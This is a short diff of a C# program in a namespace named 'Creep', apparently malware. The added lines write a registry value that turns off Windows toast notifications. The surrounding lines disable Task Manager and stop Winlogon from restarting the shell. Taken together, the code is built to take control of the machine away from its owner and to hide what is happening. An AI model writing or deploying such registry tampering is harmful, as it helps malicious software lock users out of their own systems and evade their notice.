@@ -91,6 +91,10 @@ namespace Creep
             editKey.SetValue("DisableTaskMgr", "1");
             editKey.Close();
 
+            editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\PushNotifications");
+            editKey.SetValue("ToastEnabled", "0", RegistryValueKind.DWord);
+            editKey.Close();
+
             editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
             editKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
             editKey.Close();
